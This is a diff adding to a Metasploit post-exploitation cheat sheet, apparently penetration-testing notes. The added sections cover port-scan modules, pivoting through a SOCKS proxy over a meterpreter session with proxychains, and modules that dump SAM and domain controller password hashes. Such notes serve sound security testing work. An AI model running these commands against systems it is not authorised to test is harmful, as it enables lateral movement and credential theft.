@@ -36,8 +36,23 @@ route
 Subnet       Netmask        Gateway
 ```
 
+### Port Scan
+```bash
+search auxiliary/scanner/portscan
+
+   #  Name                                  Disclosure Date  Rank    Check  Description
+   -  ----                                  ---------------  ----    -----  -----------
+   0  auxiliary/scanner/portscan/ftpbounce                   normal  No     FTP Bounce Port Scanner
+   1  auxiliary/scanner/portscan/xmas                        normal  No     TCP "XMas" Port Scanner
+   2  auxiliary/scanner/portscan/ack                         normal  No     TCP ACK Firewall Scanner
+   3  auxiliary/scanner/portscan/tcp                         normal  No     TCP Port Scanner
+   4  auxiliary/scanner/portscan/syn                         normal  No     TCP SYN Port Scanner
+```
+
 ### SOCKS
 ##### Start SOCKS Proxy for Proxy Chains
+Proxychains sends all of the traffic on the designated port to the local, metasploit, socks proxy.
+Metasploit uses the configured routes to route the traffic to the desired host, over a meterpreter session.
 ```bash
 cat /etc/proxychains4.conf
 
@@ -48,6 +63,10 @@ set SRVPORT <Port # from /etc/proxychains4.conf>
 set VERSION <Version> # socks4 = 4a, socks5 = 5.
 run
 jobs
+
+# Example command
+proxychains nmap -sT -Pn -n <Target Host on another subnet>
+proxychains ssh <Target Host on another subnet>
 ```
 
 ### Use with Other Applications
@@ -226,13 +245,21 @@ creds_all
 run hashdump
 # It is possible to just call "hashdump," but that may fail, even as SYSTEM, where as "run hashdump" may succeed.
 ```
+##### Windows Gather Hashes and Tokens
+```bash
+# This module harvests credentials found on the host and stores them in the database.
+use post/windows/gather/credentials/credential_collector
+```
 ##### Windows Gather Local User Account Password Hashes (Registry)
 ```bash
+# This module will dump the local user accounts from the SAM database using the registry
 use post/windows/gather/hashdump
 # Stores hashes both in the database and the loot folder.
 ```
 ##### Windows Gather Local and Domain Controller Account Password Hashes
 ```bash
+# This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account 
+# Database using the proper technique depending on privilege level, OS and role of the host.
 use post/windows/gather/smart_hashdump
 # Stores hashes both in the database and the loot folder.
 ```
